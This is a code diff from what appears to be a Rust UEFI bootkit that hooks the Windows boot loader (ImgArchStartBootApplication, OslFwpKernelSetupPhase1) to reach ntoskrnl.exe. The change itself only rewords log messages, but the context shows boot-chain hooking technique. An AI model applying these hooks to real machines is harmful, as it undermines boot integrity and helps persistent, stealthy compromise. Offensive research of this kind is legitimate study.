@@ -114,7 +114,7 @@ pub fn img_arch_start_boot_application_hook(
         )
     };
 
-    log::info!("[*] ImgArchStartBootApplication Hook called!\n\n");
+    log::info!("[*] ### ImgArchStartBootApplication Hook ###");
 
     // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
     let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };
@@ -187,7 +187,7 @@ pub fn img_arch_start_boot_application_hook(
         .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
     }
 
-    log::info!("[+] Calling Original ImgArchStartBootApplication \n\n");
+    log::info!("[+] Calling Original ImgArchStartBootApplication");
 
     // Call the original unhooked ImgArchStartBootApplication function
     return unsafe {
@@ -278,7 +278,7 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
         )
     };
 
-    log::info!("[*] OslFwpKernelSetupPhase1 Hook called!\n\n");
+    log::info!("[*] ### OslFwpKernelSetupPhase1 Hook ###");
 
     // ntoskrnl.exe hash: 0xa3ad0390
     // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size
